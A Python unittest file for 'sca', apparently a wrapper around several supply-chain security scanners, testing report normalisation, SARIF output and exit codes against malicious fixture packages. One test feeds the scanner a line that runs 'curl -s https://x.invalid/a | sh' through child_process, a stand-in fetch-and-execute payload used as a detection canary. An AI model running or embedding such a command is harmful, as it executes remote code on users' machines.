"""Normalisation of every output shape the family emits, the report schema, SARIF 2.1.0
structure, and sca's exit codes / pass-through behaviour (real scanners, real canaries)."""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
import sca  # noqa: E402

SCA = [sys.executable, "-I", os.path.join(ROOT, "sca.py")]
SC = sca.SCANNER_DIR
NPM_MAL = os.path.join(SC, "npm-audit", "tests", "fixtures", "mal-curl-sh")          # CRITICAL
NPM_OK = os.path.join(SC, "npm-audit", "tests", "fixtures", "ok-config-loader")      # SAFE
UJS_HIGH = os.path.join(SC, "userscript-audit", "tests", "fixtures", "mal-storage-dump.user.js")  # HIGH
UJS_MED = os.path.join(SC, "userscript-audit", "tests", "fixtures", "med-url-leak.user.js")       # MEDIUM


def load(path):
    with open(path, encoding="utf-8") as fh:
        return json.load(fh)


SCHEMA = load(os.path.join(ROOT, "schema", "sca-report.schema.json"))


def run(*args, cwd=None):
    p = subprocess.run(SCA + list(args), capture_output=True, text=True, cwd=cwd, timeout=600)
    return p.returncode, p.stdout, p.stderr


def validate(inst, schema, root=SCHEMA, path="$"):
    """Tiny JSON-Schema subset (type/const/enum/required/properties/items/additionalProperties/$ref/minimum)."""
    if "$ref" in schema:
        node = root
        for part in schema["$ref"].lstrip("#/").split("/"):
            node = node[part]
        return validate(inst, node, root, path)
    errs = []
    types = schema.get("type")
    if types:
        types = types if isinstance(types, list) else [types]
        pyt = {"object": dict, "array": list, "string": str, "integer": int, "number": (int, float),
               "boolean": bool, "null": type(None)}
        if not any(isinstance(inst, pyt[t]) and not (t in ("integer", "number") and isinstance(inst, bool))
                   for t in types):
            return ["%s: %r is not %s" % (path, inst, types)]
    if "const" in schema and inst != schema["const"]:
        errs.append("%s: %r != %r" % (path, inst, schema["const"]))
    if "enum" in schema and inst not in schema["enum"]:
        errs.append("%s: %r not in %s" % (path, inst, schema["enum"]))
    if "minimum" in schema and isinstance(inst, (int, float)) and inst < schema["minimum"]:
        errs.append("%s: %r < %s" % (path, inst, schema["minimum"]))
    if isinstance(inst, dict):
        for k in schema.get("required", []):
            if k not in inst:
                errs.append("%s: missing %s" % (path, k))
        for k, v in inst.items():
            if k in schema.get("properties", {}):
                errs += validate(v, schema["properties"][k], root, path + "." + k)
            elif isinstance(schema.get("additionalProperties"), dict):
                errs += validate(v, schema["additionalProperties"], root, path + "." + k)
    if isinstance(inst, list) and "items" in schema:
        for i, v in enumerate(inst):
            errs += validate(v, schema["items"], root, "%s[%d]" % (path, i))
    return errs


class Normalise(unittest.TestCase):
    def test_classic_dict(self):
        r = sca.normalise("npm", {"target": "x", "risk_level": "HIGH", "risk_score": 9, "findings": [
            {"severity": "HIGH", "id": "obfuscation", "name": "Obfuscation", "description": "d", "file": "a.js",
             "line": 3, "matched": "m", "context": "c", "when": "install"}], "info": [{}], "info_count": 1})
        self.assertEqual((r["verdict"], r["max_severity"], r["tool"]), ("HIGH", "HIGH", "npm-audit"))
        f = r["findings"][0]
        self.assertEqual((f["rule"], f["file"], f["line"], f["message"]), ("obfuscation", "a.js", 3, "Obfuscation: d"))
        self.assertEqual(f["extra"], {"when": "install"})

    def test_winpkg_line_string(self):
        f = sca.normalise_finding("winpkg", {"severity": "CRITICAL", "id": "x", "line": "chocolateyInstall.ps1:L12"}, "t")
        self.assertEqual((f["file"], f["line"]), ("chocolateyInstall.ps1", 12))

    def test_zero_line_and_missing_file(self):
        f = sca.normalise_finding("homebrew", {"severity": "high", "id": "x", "line": 0}, "t")
        self.assertEqual((f["severity"], f["file"], f["line"]), ("HIGH", None, None))

    def test_error_entry_becomes_error_verdict(self):
        r = sca.normalise("crate", {"target": "nope", "risk_level": "SAFE", "error": "404", "findings": []})
        self.assertEqual((r["verdict"], r["error"]), ("ERROR", "404"))
        r = sca.normalise("hf", {"target": "x", "risk_level": "ERROR", "findings": []})
        self.assertEqual(r["verdict"], "ERROR")

    def test_max_severity_takes_findings_and_verdict(self):
        r = sca.normalise("npm", {"target": "x", "risk_level": "HIGH", "findings": [{"severity": "MEDIUM", "id": "a"}]})
        self.assertEqual(r["max_severity"], "HIGH")  # score-escalated verdict above every single finding
        r = sca.normalise("npm", {"target": "x", "risk_level": "LOW", "findings": [{"severity": "CRITICAL", "id": "a"}]})
        self.assertEqual(r["max_severity"], "CRITICAL")

    def test_family_envelope(self):
        raw = {"schema": "eltociear-audit/1", "results": [
            {"target": "a", "risk_level": "CRITICAL", "findings": [{"severity": "CRITICAL", "rule_id": "r1", "line": 0}]},
            {"target": "b", "risk_level": "SAFE", "findings": []}]}
        items = raw["results"] if str(raw.get("schema", "")).startswith("eltociear-audit/") else [raw]
        res = [sca.normalise("mcp", it) for it in items]
        self.assertEqual([r["verdict"] for r in res], ["CRITICAL", "SAFE"])
        self.assertEqual(res[0]["findings"][0]["rule"], "r1")

    def test_parse_json_with_leading_text(self):
        self.assertEqual(sca._parse_json('note: x\n[{"a": 1}]'), [{"a": 1}])
        self.assertIsNone(sca._parse_json("Traceback ..."))


class EndToEnd(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="sca-e2e-")
        # a mixed tree: an npm canary, a userscript canary and a benign terraform module
        shutil.copytree(NPM_MAL, os.path.join(cls.tmp, "web"))
        shutil.copy(UJS_HIGH, os.path.join(cls.tmp, "web", "helper.user.js"))
        shutil.copytree(os.path.join(HERE, "fixtures", "detect", "terraform"), os.path.join(cls.tmp, "infra"))

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_scan_mixed_tree_json_conforms_to_schema(self):
        rc, out, _ = run("scan", self.tmp, "--json")
        self.assertEqual(rc, 2)
        rep = json.loads(out)
        self.assertEqual(validate(rep, SCHEMA), [])
        ecos = {(r["ecosystem"], os.path.basename(r["target"])) for r in rep["results"]}
        self.assertTrue({("npm", "web"), ("userscript", "helper.user.js"), ("terraform", "infra")} <= ecos, ecos)
        self.assertEqual(rep["summary"]["max_severity"], "CRITICAL")
        self.assertTrue(all(r["tool_commit"] for r in rep["results"]))

    def test_sarif_structure(self):
        rc, out, _ = run("scan", self.tmp, "--sarif")
        self.assertEqual(rc, 2)
        s = json.loads(out)
        self.assertEqual(s["version"], "2.1.0")
        self.assertIn("sarif-2.1.0", s["$schema"])
        names = [run_["tool"]["driver"]["name"] for run_ in s["runs"]]
        self.assertEqual(len(names), len(set(names)), "one run per scanner")
        self.assertTrue({"npm-audit", "userscript-audit", "terraform-audit"} <= set(names))
        n = 0
        for run_ in s["runs"]:
            rules = run_["tool"]["driver"]["rules"]
            self.assertEqual(len({r["id"] for r in rules}), len(rules))
            for r in rules:
                self.assertIn(r["defaultConfiguration"]["level"], ("error", "warning", "note", "none"))
                float(r["properties"]["security-severity"])
            for res in run_["results"]:
                n += 1
                self.assertEqual(rules[res["ruleIndex"]]["id"], res["ruleId"])
                self.assertIn(res["level"], ("error", "warning", "note", "none"))
                self.assertTrue(res["message"]["text"])
                loc = res["locations"][0]["physicalLocation"]
                self.assertFalse(loc["artifactLocation"]["uri"].startswith("./"))
                if "region" in loc:
                    self.assertGreaterEqual(loc["region"]["startLine"], 1)
            for inv in run_["invocations"]:
                self.assertIsInstance(inv["executionSuccessful"], bool)
        self.assertGreater(n, 0)

    def test_sarif_file_output(self):
        out = os.path.join(self.tmp, "r.sarif")
        rc, _, _ = run("npm", NPM_MAL, "--sarif", "-o", out)
        self.assertEqual(rc, 2)
        self.assertEqual(load(out)["runs"][0]["tool"]["driver"]["name"], "npm-audit")
        os.remove(out)

    def test_exit_codes(self):
        self.assertEqual(run("npm", NPM_MAL)[0], 2)                            # CRITICAL >= default high
        self.assertEqual(run("npm", NPM_OK)[0], 0)                             # SAFE
        self.assertEqual(run("npm", NPM_MAL, "--fail-on", "none")[0], 0)
        self.assertEqual(run("userscript", UJS_HIGH, "--fail-on", "critical")[0], 0)   # HIGH < critical
        self.assertEqual(run("userscript", UJS_HIGH, "--fail-on=high")[0], 2)
        self.assertEqual(run("userscript", UJS_MED)[0], 0)                     # MEDIUM < high
        self.assertEqual(run("userscript", UJS_MED, "--fail-on", "medium")[0], 2)
        self.assertEqual(run("scan", self.tmp, "--fail-on", "none")[0], 0)
        self.assertEqual(run("scan", os.path.join(HERE, "fixtures", "detect", "none"))[0], 1)  # nothing recognised
        self.assertEqual(run("scan", os.path.join(self.tmp, "does-not-exist"))[0], 1)
        self.assertEqual(run("nosuch-ecosystem", "x")[0], 1)
        self.assertEqual(run("npm", NPM_OK, "--fail-on", "bogus")[0], 1)

    def test_passthrough_args_and_raw(self):
        rc, out, _ = run("npm", "--text", "require('child_process').exec('curl -s https://x.invalid/a | sh')", "--json")
        self.assertEqual(rc, 2)
        rep = json.loads(out)
        self.assertEqual(rep["mode"], "single")
        self.assertIn("--text", rep["results"][0]["command"])
        rc, out, _ = run("crate", os.path.join(SC, "crate-audit", "tests", "fixtures", "mal-build-curl-sh"),
                         "--build-only", "--json")  # scanner flag passes through
        self.assertIn("--build-only", json.loads(out)["results"][0]["command"])
        rc, out, _ = run("npm", NPM_MAL, "--raw")
        self.assertEqual(rc, 2)                                                # the scanner's own exit code
        self.assertNotIn("schema_version", out)                                # its native output
        rc, out, _ = run("tf", os.path.join(HERE, "fixtures", "detect", "terraform"), "--json")  # alias
        self.assertEqual(json.loads(out)["results"][0]["tool"], "terraform-audit")

    def test_scanner_crash_is_an_error_not_a_pass(self):
        rc, out, _ = run("obsidian", os.path.join(self.tmp, "no-such-plugin"), "--json")  # exits 1, no JSON
        self.assertEqual(rc, 1)
        r = json.loads(out)["results"][0]
        self.assertEqual(r["verdict"], "ERROR")

    def test_mixed_safe_and_error_results_fail_closed(self):
        safe = sca.normalise("npm", {"target": "ok", "risk_level": "SAFE", "findings": []})
        error = sca.normalise("hf", {
            "target": "broken", "risk_level": "SAFE", "findings": [],
            "error": "scanner returned no results",
        })
        report = sca.build_report([safe, error], ".", "high")

        self.assertFalse(report["summary"]["failed"], "severity gate is separate from scanner health")
        self.assertEqual(report["summary"]["errors"], 1)
        self.assertEqual(sca._exit_code(report), 1)

    def test_unknown_scanner_verdict_fails_closed(self):
        safe = sca.normalise("npm", {"target": "ok", "risk_level": "SAFE", "findings": []})
        unknown = sca.normalise("crate", {"target": "odd", "risk_level": "MYSTERY", "findings": []})
        report = sca.build_report([safe, unknown], ".", "high")

        self.assertEqual(unknown["verdict"], "ERROR")
        self.assertEqual(sca._exit_code(report), 1)

    def test_list_and_versions(self):
        rc, out, _ = run("list", "--json")
        rows = json.loads(out)
        self.assertEqual(rc, 0)
        self.assertEqual(len(rows), len(sca.ADAPTERS))
        self.assertTrue(all(r["vendored"] and len(r["commit"]) == 12 for r in rows), rows)
        v = load(os.path.join(SC, "VERSIONS.json"))["scanners"]
        for eco, a in sca.ADAPTERS.items():
            self.assertEqual(len(v[a["repo"]]["commit"]), 40)
            self.assertTrue(os.path.isfile(os.path.join(SC, a["repo"], "LICENSE")), a["repo"])

    def test_help_for_every_scanner(self):
        for eco in sorted(sca.ADAPTERS):
            with self.subTest(eco):
                rc, out, _ = run("help", eco)
                self.assertEqual(rc, 0)
                self.assertIn("sca adapter quirks", out)
                self.assertGreater(len(out), 200)

    def test_dry_run(self):
        rc, out, _ = run("scan", self.tmp, "--dry-run")
        self.assertEqual(rc, 0)
        self.assertIn("scanner run(s) planned", out)


if __name__ == "__main__":
    unittest.main()
